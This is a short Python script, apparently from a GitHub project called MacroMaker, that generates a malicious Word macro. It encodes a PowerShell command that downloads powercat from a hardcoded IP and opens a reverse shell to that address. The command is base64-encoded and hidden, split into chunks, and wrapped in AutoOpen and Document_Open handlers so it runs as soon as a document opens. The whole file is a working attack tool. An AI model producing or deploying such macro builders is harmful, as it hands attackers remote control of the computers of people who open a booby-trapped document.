# By 0d1n 5/19/2023 MacroMaker - https://github.com/c0d30d1n/VBAMacroMaker/
import base64

plain_text_payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166/Windows/powercat.ps1');powercat -c 192.168.45.166 -p 443 -e powershell"
plain_text_payload_bytes = plain_text_payload.encode("UTF-16LE")

base64_payload = base64.b64encode(plain_text_payload_bytes)
base_payload_string = base64_payload.decode("ascii")

print(f"\nEncoded String : {base_payload_string}")

str = 'powershell.exe -nop -w hidden -enc ' + base_payload_string

print('\nFull Command: ' + str)

n = 50
print("\nString broken into 50 byte chunks for usage with VBA Macro.\n")

def splitter(fs):
	for i in range(0, len(fs), n): print("\t\tStr = Str + " + '"' + fs[i:i+n] + '"')

splitter(str)
print("\nVBA Macro Output: ")
vba1 = '''\n\nSub AutoOpen()\r\n	MyMacro\r\nEnd Sub\r\n\r\nSub Document_Open()\r\n	MyMacro\r\nEnd Sub\r\n\r\n\r\nSub MyMacro()\r\n	Dim Str As String\r\n'''
			
vba2 = '''\r\n\tCreateObject(\"Wscript.Shell\").Run Str\r\nEnd Sub'''

print(vba1)
splitter(str)
print(vba2)
